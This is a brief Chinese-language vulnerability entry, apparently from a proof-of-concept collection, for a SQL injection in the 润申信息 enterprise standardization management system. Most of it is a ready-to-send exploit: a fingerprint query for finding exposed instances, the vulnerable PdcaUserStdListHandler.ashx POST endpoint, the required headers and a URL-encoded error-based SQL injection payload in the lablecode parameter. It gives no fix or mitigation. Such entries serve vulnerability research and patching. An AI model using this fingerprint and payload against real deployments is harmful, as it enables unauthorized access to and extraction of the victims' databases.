# 润申信息企业标准化管理系统-PdcaUserStdListHandler存在SQL注入漏洞

- **系统**：润申信息企业标准化管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="PDCA/js/_publicCom.js"`
- **请求**：`POST /PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
code=1&lablecode=%28CONVERT%28INT%2C%28SELECT+CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285612%3D5612%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%29&LableName=&page=1rows=3
```
- **预期**：200　|　—